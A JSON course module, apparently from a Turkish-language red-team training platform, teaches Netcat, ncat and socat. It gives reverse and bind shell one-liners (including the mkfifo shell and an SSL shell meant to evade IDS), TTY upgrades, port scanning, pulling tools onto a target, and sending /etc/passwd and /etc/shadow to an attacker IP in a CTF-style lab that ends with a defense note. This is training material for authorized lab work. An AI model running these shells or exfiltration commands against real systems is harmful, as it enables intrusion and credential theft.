@@ -1,0 +1,164 @@
+{
+  "id": "netcat",
+  "slug": "netcat",
+  "title": "Netcat (nc)",
+  "subtitle": "Ağın İsviçre Çakısı — Dinle, Bağlan, Transfer Et",
+  "description": "Netcat, TCP/UDP üzerinde ham bağlantı kuran tek araçtır. Listener açmak, reverse/bind shell almak, port tarama, dosya transfer, banner grabbing — pentest'in her adımında nc kullanırsın.",
+  "team": "red-team",
+  "category": "Shell & Erişim",
+  "phase": "Exploitation / Post-Exploitation",
+  "icon": "🔌",
+  "color": "#22d3ee",
+  "tags": ["netcat", "nc", "listener", "reverse-shell", "bind-shell", "port-scan", "file-transfer", "banner-grab", "ncat", "socat"],
+  "modules": [
+    {
+      "id": "nc-temeller",
+      "title": "Netcat Temelleri — Dinle ve Bağlan",
+      "description": "nc ile TCP listener açmak, hedefe bağlanmak, interaktif sohbet kurmak ve banner yakalamak.",
+      "difficulty": "beginner",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "nc-theory",
+          "type": "theory",
+          "title": "Netcat Nedir ve Neden Her Pentester Bilmeli?",
+          "content": "Netcat (`nc`), TCP veya UDP üzerinde ham veri gönderip alan minimal bir araçtır. 1995'ten beri değişmeden kullanılır — çünkü mükemmel tasarlanmıştır.\n\n**Neden bu kadar önemli?**\n- Neredeyse her Linux/Unix sistemde önceden yüklüdür\n- Reverse shell almak için standart listener: `nc -lvnp 4444`\n- Hiç araç yoksa port tarayıcı, banner grabber, dosya transfer aracı\n- CTF'lerde ve gerçek pentestlerde her adımda kullanılır\n\n**Versiyonlar:**\n| Versiyon | Fark |\n|----------|------|\n| `nc` (traditional) | `-e` flag'i var (doğrudan shell) |\n| `ncat` (Nmap projesi) | SSL desteği, daha güvenli |\n| `nc.openbsd` | `-e` yok (güvenlik) — Debian/Ubuntu default |\n\n**Kali'de genellikle ncat yüklüdür.** `which nc && nc --version` ile kontrol et.\n\n**Temel syntax:**\n```\nnc [seçenekler] [hedef] [port]\n```\n\n**En sık kullanılan flagler:**\n| Flag | Anlamı |\n|------|--------|\n| `-l` | Listen mode (dinle) |\n| `-v` | Verbose (ayrıntılı çıktı) |\n| `-n` | DNS çözümleme yapma (sadece IP) |\n| `-p PORT` | Port belirt |\n| `-e /bin/bash` | Bağlantıya shell bağla (traditional nc) |\n| `-u` | UDP modu (default TCP) |\n| `-z` | Port tarama modu (veri gönderme) |\n| `-w N` | N saniye timeout |\n| `-k` | Bağlantı kapanınca dinlemeye devam et |"
+        },
+        {
+          "id": "nc-baglanti",
+          "type": "commands",
+          "title": "Bağlantı Kurma ve Listener",
+          "commands": [
+            {
+              "command": "# KALI'DE — Listener aç:\nnc -lvnp 4444\n\n# HEDEF MAKİNEDE — Kali'ye bağlan:\nnc 10.10.14.5 4444",
+              "description": "En temel kullanım: iki makine arasında TCP \"sohbet\" kanalı. Biri dinler, diğeri bağlanır — yazdığın her şey karşı tarafa gider.",
+              "output": "Kali:\nListening on 0.0.0.0 4444\nConnection received on 10.10.10.1 54321\nmerhaba\n\nHedef:\nmerhaba",
+              "tip": "-l (listen) + -v (verbose) + -n (no DNS) + -p (port) = -lvnp. Ezberle, her gün yazacaksın."
+            },
+            {
+              "command": "# Banner grabbing — servis ne diyor?\necho '' | nc -nv 10.10.10.1 22\necho '' | nc -nv 10.10.10.1 80\necho '' | nc -nv 10.10.10.1 21\n\n# HTTP isteği manuel gönder:\necho -e 'GET / HTTP/1.0\\r\\n\\r\\n' | nc -nv 10.10.10.1 80",
+              "description": "nc ile banner grabbing — servis bağlantıda kendini tanıtır. SSH, FTP, SMTP, HTTP başlık bilgisi alınır.",
+              "output": "# Port 22:\nConnection to 10.10.10.1 22 port [tcp/*] succeeded!\nSSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8\n\n# Port 80:\nHTTP/1.1 200 OK\nServer: Apache/2.4.18 (Ubuntu)\nX-Powered-By: PHP/7.0.33",
+              "tip": "Versiyon bilgisi → searchsploit / ExploitDB araması için doğrudan girdi."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "nc-shell",
+      "title": "Reverse Shell & Bind Shell",
+      "description": "nc ile reverse ve bind shell alma — traditional nc, mkfifo yöntemi ve ncat SSL.",
+      "difficulty": "beginner",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "shell-theory",
+          "type": "theory",
+          "title": "Reverse Shell vs Bind Shell — Fark Nedir?",
+          "content": "**Reverse Shell:** Hedef makine, saldırgana doğru bağlantı kurar.\n```\nSaldırgan (nc -lvnp 4444) ◄── Hedef (nc KALI 4444 -e /bin/bash)\n```\n✅ Çoğu durumda kullanılır — firewall çoğu zaman giden trafiği engellemez.\n\n**Bind Shell:** Hedef makine bir port açar, saldırgan oraya bağlanır.\n```\nSaldırgan (nc HEDEF 5555) ──► Hedef (nc -lvnp 5555 -e /bin/bash)\n```\n✅ Saldırganın IP'si değişkenken (VPN yok) işe yarar.\n⚠️ Firewall gelen bağlantıyı bloklar — daha az yaygın.\n\n**Ne zaman hangisi?**\n- Genellikle: **Reverse shell** (hedef güvenlik duvarı gelen trafiği bloklar)\n- NAT arkasındaysan: Bind shell veya port forwarding"
+        },
+        {
+          "id": "shell-komutlar",
+          "type": "commands",
+          "title": "Reverse ve Bind Shell Komutları",
+          "commands": [
+            {
+              "command": "# === REVERSE SHELL ===\n\n# KALI — listener:\nnc -lvnp 4444\n\n# HEDEF — traditional nc (-e flag'i varsa):\nnc 10.10.14.5 4444 -e /bin/bash\n\n# HEDEF — nc.openbsd (-e yok, mkfifo kullan):\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f",
+              "description": "Reverse shell — hedef Kali'ye bağlanır, Kali shell alır. mkfifo yöntemi -e olmayan nc versiyonlarında çalışır.",
+              "output": "# Kali'de:\nListening on 0.0.0.0 4444\nConnection received on 10.10.10.1 51234\nwww-data@hedef:/var/www/html$",
+              "tip": "mkfifo ile oluşturulan /tmp/f geçici bir named pipe'tır — shell'i iki yönlü kanaldan bağlar. Komutu anlamak zorunda değilsin, ezberle ve kullan."
+            },
+            {
+              "command": "# === BIND SHELL ===\n\n# HEDEF — port 5555'te shell dinle:\nnc -lvnp 5555 -e /bin/bash\n\n# KALI — hedefe bağlan:\nnc 10.10.10.1 5555",
+              "description": "Bind shell — hedef bekler, saldırgan bağlanır.",
+              "tip": "Bind shell zaten bir foothold gerektiriyor (komutu hedefte çalıştırmalısın). Çoğunlukla webshell veya RCE üzerinden kullanılır."
+            },
+            {
+              "command": "# ncat ile SSL şifreli reverse shell (IDS atlatma):\n\n# KALI:\nncat --ssl -lvnp 4444\n\n# HEDEF:\nncat --ssl 10.10.14.5 4444 -e /bin/bash",
+              "description": "SSL şifreli reverse shell — trafik şifreli olduğu için IDS/IPS imza tabanlı tespiti zorlaşır.",
+              "tip": "ncat Kali'de nmap paketiyle gelir. `which ncat` ile kontrol et."
+            },
+            {
+              "command": "# Shell aldıktan sonra TTY upgrade (çok önemli!):\n\n# 1. Python ile pseudo-terminal:\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# 2. Ctrl+Z (arka plana at)\n\n# 3. Kali terminalinde:\nstty raw -echo; fg\n\n# 4. Shell içinde:\nexport TERM=xterm\nstty rows 40 cols 160",
+              "description": "TTY upgrade — ham nc shell'i tam etkileşimli terminale çevir. Olmadan: Ctrl+C shell'i öldürür, tab complete çalışmaz, vim açılmaz.",
+              "warning": "stty raw -echo'dan sonra yanlış tuşlara basarsan terminal bozulabilir. Reset: reset komutu veya yeni terminal aç.",
+              "tip": "python3 yoksa: script /dev/null -c bash veya /usr/bin/script -qc /bin/bash /dev/null"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "nc-port-transfer",
+      "title": "Port Tarama, Dosya Transferi & Port Forward",
+      "description": "nc ile araç olmadan port tara, dosya gönder/al ve basit port yönlendirmesi yap.",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "port-transfer-komutlar",
+          "type": "commands",
+          "title": "Port Tarama ve Dosya Transferi",
+          "commands": [
+            {
+              "command": "# Port tarama (nmap yokken):\nnc -zv 10.10.10.1 1-1024 2>&1 | grep succeeded\n\n# Tek port kontrol:\nnc -zv 10.10.10.1 443\n\n# UDP port tarama:\nnc -zuv 10.10.10.1 53 161 123",
+              "description": "-z flag'i bağlantı kurmadan (veri göndermeden) port açık mı diye test eder. Nmap olmadan minimal port tarama.",
+              "output": "Connection to 10.10.10.1 22 port [tcp/ssh] succeeded!\nConnection to 10.10.10.1 80 port [tcp/http] succeeded!\nConnection to 10.10.10.1 443 port [tcp/https] succeeded!",
+              "tip": "Hızlı değil — her port için ayrı bağlantı kurar. 1-1024 için yavaş olabilir. Sadece nmap yoksa kullan."
+            },
+            {
+              "command": "# Dosya GÖNDERME (hedeften Kali'ye):\n\n# KALI — al:\nnc -lvnp 9001 > alinan_dosya.txt\n\n# HEDEF — gönder:\nnc 10.10.14.5 9001 < /etc/passwd\n\n# Dizin transfer (tar ile):\n# KALI — al:\nnc -lvnp 9001 | tar xvf -\n\n# HEDEF — gönder:\ntar cvf - /home/user/ | nc 10.10.14.5 9001",
+              "description": "nc ile dosya transfer — HTTP sunucusu, curl, wget olmadığında hayat kurtarır.",
+              "tip": "Transfer tamamlayınca nc otomatik kapanmaz — Ctrl+C ile kapat. MD5 ile doğrula: md5sum dosya"
+            },
+            {
+              "command": "# Dosya ALMA (Kali'den hedefe):\n\n# KALI — sun:\nnc -lvnp 9001 < linpeas.sh\n\n# HEDEF — al:\nnc -nv 10.10.14.5 9001 > linpeas.sh\nchmod +x linpeas.sh && ./linpeas.sh",
+              "description": "Kali'den hedefe araç transferi — linpeas, winpeas, exploit dosyaları.",
+              "tip": "nc pipe yönü: < gönderir, > alır, | bir programa iletir."
+            },
+            {
+              "command": "# Basit port forward (pivot için):\n# Hedef 10.10.10.1'in 3306 portunu Kali'nin 33060 portuna yönlendir:\n\n# Kali'de:\nmkfifo /tmp/pipe\nnc -lvnp 33060 < /tmp/pipe | nc 10.10.10.1 3306 > /tmp/pipe\n\n# Artık Kali'nin 33060 portuna bağlanmak = hedefin 3306'sına bağlanmak:\nmysql -h 127.0.0.1 -P 33060 -u root",
+              "description": "nc ile basit port yönlendirme — pivot için. Daha gelişmişi için chisel/ligolo kullan.",
+              "tip": "Bu yöntem tek bağlantı destekler. Birden fazla bağlantı gerekiyorsa socat kullan: socat TCP-LISTEN:33060,fork TCP:10.10.10.1:3306"
+            }
+          ]
+        },
+        {
+          "id": "socat-bonus",
+          "type": "advanced",
+          "title": "socat — nc'nin Güçlü Kardeşi",
+          "content": "**socat** (SOcket CAT), netcat'ten daha güçlüdür ama daha az yaygın kurulur.\n\n**nc'den farkları:**\n- Her iki uçta da farklı protokol kullanabilir\n- SSL terminasyonu yerleşik\n- PTY (pseudo-terminal) doğrudan açabilir — TTY upgrade gerekmez!\n- Çoklu bağlantı (fork)\n\n```bash\n# Tam TTY reverse shell (upgrade gerekmez!):\n# KALI:\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\n\n# HEDEF:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444\n\n# SSL ile şifreli bind shell:\n# Sertifika oluştur:\nopenssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt\ncat shell.key shell.crt > shell.pem\n\n# HEDEF dinle:\nsocat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:/bin/bash\n\n# KALI bağlan:\nsocat OPENSSL:10.10.10.1:4444,verify=0 -\n```\n\nsocat genellikle `apt install socat` ile kurulur. Hedefte yoksa statik binary indir: `wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat`"
+        },
+        {
+          "id": "nc-lab",
+          "type": "lab",
+          "title": "Lab: nc ile Sıfırdan Shell Alma",
+          "scenario": {
+            "title": "Webshell → nc Reverse Shell → TTY Upgrade → Dosya Transfer",
+            "objective": "Bir webshell üzerinden nc ile reverse shell al, TTY'yi yükselt ve hedeften /etc/shadow dosyasını kendi makinene transfer et.",
+            "environment": "TryHackMe: 'RootMe' veya 'Simple CTF' odası | DVWA (Docker) | Herhangi HTB Easy Linux makinesi",
+            "difficulty": "beginner",
+            "steps": [
+              "nc -lvnp 4444 ile Kali'de listener aç",
+              "Webshell veya RCE ile hedefte: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc KALI_IP 4444>/tmp/f",
+              "Shell gelince: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+              "Ctrl+Z → stty raw -echo → fg → export TERM=xterm",
+              "Tab complete ve ok tuşlarının çalıştığını doğrula",
+              "Kali'de ikinci terminal: nc -lvnp 9001 > shadow.txt",
+              "Hedefte: cat /etc/shadow | nc KALI_IP 9001",
+              "Kali'de alınan dosyayı doğrula: cat shadow.txt"
+            ],
+            "hints": [
+              "mkfifo /tmp/f hata verirse /dev/shm/f dene (genellikle yazılabilir)",
+              "Ctrl+Z'den sonra terminal bozulursa: reset komutu",
+              "nc versiyonunu kontrol et: nc -h 2>&1 | head -5 — -e flag'i varsa doğrudan kullan"
+            ],
+            "flag": "Hedefte /root/root.txt veya /etc/shadow içeriği",
+            "defenseNote": "Savunma: Outbound trafik whitelist'i (sadece 80/443 çıkışına izin ver). Egress filtering. IDS'te nc/netcat process oluşumu ve mkfifo kullanımını izle. EDR: shell spawn edilen process'lerin parent'ını kontrol et (php → bash doğrudan başlatma anomalisi)."
+          }
+        }
+      ]
+    }
+  ]
+}
